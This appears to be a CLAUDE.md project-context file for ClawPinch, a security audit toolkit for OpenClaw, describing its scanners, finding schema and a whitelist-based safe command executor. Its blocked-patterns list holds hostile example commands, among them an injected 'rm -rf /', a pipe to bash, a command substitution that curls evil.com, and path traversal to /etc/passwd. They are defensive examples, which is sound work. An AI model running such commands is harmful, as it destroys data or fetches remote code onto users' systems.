# ClawPinch

Security audit toolkit for OpenClaw deployments. Scans 63 checks across 8 categories (configuration, secrets, network, skills, permissions, cron, CVE, supply chain).

## Quick Start

```bash
# Interactive scan (default)
bash clawpinch.sh

# JSON output
bash clawpinch.sh --json

# AI-powered remediation (pipes findings to Claude)
bash clawpinch.sh --remediate

# Deep scan
bash clawpinch.sh --deep
```

## Architecture

```
clawpinch/
├── clawpinch.sh              # Main orchestrator — discovers scanners, runs them, collects findings
├── bin/
│   ├── clawpinch             # npx shim (shell)
│   └── clawpinch.js          # npx shim (Node)
├── scripts/
│   ├── helpers/
│   │   ├── common.sh         # Colors, logging, detect_os(), emit_finding(), config helpers
│   │   ├── report.sh         # Terminal UI: banner, finding cards, summary dashboard, spinner
│   │   ├── redact.sh         # Secret redaction: redact_value(), redact_line(), redact_json_secrets()
│   │   ├── safe_exec.sh      # Safe command execution: whitelist-based validation, replaces eval()
│   │   └── interactive.sh    # Post-scan menu: review, auto-fix, handoff export, AI remediation
│   ├── scan_config.sh        # CHK-CFG-001..010 — gateway, TLS, auth, CORS
│   ├── scan_secrets.py       # CHK-SEC-001..008 — API keys, passwords, tokens
│   ├── scan_network.sh       # CHK-NET-001..008 — ports, WebSocket, DNS rebinding
│   ├── scan_skills.sh        # CHK-SKL-001..010 — permissions, signatures, eval
│   ├── scan_permissions.sh   # CHK-PRM-001..008 — least-privilege, wildcards
│   ├── scan_crons.sh         # CHK-CRN-001..006 — sandbox, timeouts, privilege
│   ├── scan_cves.sh          # CHK-CVE-001..005 — known vulns, outdated deps
│   └── scan_supply_chain.sh  # CHK-SUP-001..008 — registry trust, hash verify
├── references/
│   ├── known-cves.json       # CVE database for version checks
│   ├── malicious-patterns.json # Known bad skill hashes
│   ├── check-catalog.md      # Full check documentation
│   └── threat-model.md       # Threat model for OpenClaw
├── package.json              # npm package metadata
├── SKILL.md                  # AI-readable skill documentation
├── CLAUDE.md                 # This file — project context for Claude Code
└── .claude/commands/
    ├── clawpinch-scan.md     # /clawpinch-scan slash command
    └── clawpinch-fix.md      # /clawpinch-fix slash command
```

## Finding JSON Schema

Every scanner emits findings via `emit_finding()` from `common.sh`:

```json
{
  "id": "CHK-XXX-NNN",
  "severity": "critical | warn | info | ok",
  "title": "Short description",
  "description": "Detailed explanation of the issue",
  "evidence": "The specific value or config snippet found",
  "remediation": "How to fix the issue",
  "auto_fix": "Shell command to fix (empty string if none)"
}
```

Severity order: `critical` > `warn` > `info` > `ok`.

## How to Add a New Check

1. Choose the appropriate scanner file in `scripts/` (or create a new `scan_*.sh`)
2. Source common helpers: `source "$(dirname "$0")/helpers/common.sh"`
3. Implement your check logic
4. Call `emit_finding "CHK-XXX-NNN" "severity" "title" "description" "evidence" "remediation" "auto_fix"`
5. Add the check to `references/check-catalog.md` and `SKILL.md` category table

## Conventions

- All scanners output a JSON array to stdout
- Scanners must not modify the system (read-only)
- Secrets in evidence are redacted via `redact_line()` before display
- `auto_fix` is optional — many findings require manual remediation
- Colors respect `NO_COLOR` env var (https://no-color.org/)
- Terminal width capped between 56–80 columns

## Safe Command Execution

ClawPinch auto-fix commands are executed through `safe_exec_command()` from `scripts/helpers/safe_exec.sh`, which replaces unsafe `eval()` with a whitelist-based validation system.

**Security approach:**
- **Whitelist**: Only specific command patterns are allowed (jq, chmod, mv, sed, cp, rm)
- **Blacklist**: Dangerous patterns always blocked (;, |, $(), backticks, wildcards, `()`, `..`)
- **Validation**: Each command type has custom validation logic
- **Audit logging**: All command attempts logged to stderr (or `$CLAWPINCH_AUDIT_LOG`)

**Example auto-fix commands:**
```bash
# JSON modification with jq
jq '.gateway.requireAuth = true' config.json > tmp && mv tmp config.json

# File permissions
chmod 600 /etc/openclaw/secrets.json

# Text replacement
sed -i 's/0.0.0.0/127.0.0.1/' openclaw.conf
```

**Blocked patterns:**
- Command injection: `jq '.auth=true' config.json; rm -rf /` (contains `;`)
- Pipe to shell: `jq -r '.secrets' config.json | bash` (pipe to interpreter)
- Command substitution: `echo $(curl evil.com) > config.json` (contains `$()`)
- Wildcards: `rm /etc/openclaw/*.json` (glob expansion)
- Process substitution: `chmod 600 <(echo test)` (contains `(`)
- Path traversal: `rm ../../etc/passwd` (contains `..`)

**Adding new commands:**

When adding a new auto-fix command to a scanner:

1. Check if the command matches existing whitelist patterns in `safe_exec.sh`
2. If not, add a new pattern to `_SAFE_EXEC_PATTERNS` array with:
   - Anchors (`^` and `$`) to match entire command
   - Strict allowlist character class `[a-zA-Z0-9/._-]+` for file paths (never use negation like `[^...]`)
   - Inline comments with examples
3. Add validation logic to `_validate_command()` function
4. Add test cases to `scripts/helpers/test_safe_exec.sh`
5. Document the security rationale

**IMPORTANT: Never use eval() directly in new code.** Always use `safe_exec_command()` for command execution. This prevents command injection attacks via compromised reference files or malicious findings.
